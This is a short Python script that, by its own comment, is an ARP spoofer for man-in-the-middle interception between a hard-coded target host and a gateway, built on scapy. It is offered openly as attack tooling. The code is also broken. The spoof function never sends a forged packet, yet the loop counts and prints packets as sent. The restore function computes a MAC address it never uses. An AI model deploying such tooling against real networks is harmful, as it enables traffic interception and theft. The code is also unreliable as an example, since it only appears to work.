#!/usr/bin/env python

import time
import scapy.all as scapy
import sys

#This code is an ARP spoofer in order to be the man in the middle



def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    answered_list[0][1].hwsrc
    clients_list = []
    
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    
def restore(dest, src):
    dest_mac = get_mac(dest)
    src_mac = get_mac(src)
    packet = scapy.ARP(op=2, pdst=dest, hwdst=dest_mac, psrc=src)
    scapy.send(packet, count=4, verbose=False)


target_ip = "10.0.0.3"
gateway_ip = "10.0.0.4"

try:
    sent_packet_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packet_count = sent_packet_count + 2
        print("\r[+] Sent" + str(sent_packet_count))
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt :
    print ("\n[-] Detected CRTL +C ... Resetting ARP tables ... Please wait.\n")
    restore(target_ip,gateway_ip)
    restore(gateway_ip, target_ip)